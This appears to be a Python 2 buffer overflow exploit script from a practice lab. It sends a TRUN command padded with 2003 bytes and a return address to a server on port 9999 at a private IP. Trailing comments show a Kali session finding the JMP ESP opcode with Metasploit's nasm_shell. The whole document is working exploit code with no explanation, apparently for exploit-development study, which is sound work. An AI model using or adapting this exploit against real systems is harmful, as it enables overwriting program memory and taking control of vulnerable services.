#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.187.128',9999))                          
        s.send(("TRUN /.:/" + shellcode))
        s.close()
	
except: 
        print "Error connecting to server"
        sys.exit()



#kali@kali:~/Desktop/BufferOverflow$ locate nasm_shell
#/usr/bin/msf-nasm_shell
#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#kali@kali:~/Desktop/BufferOverflow$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#nasm > JMP ESP
#00000000  FFE4              jmp esp
#nasm > exit

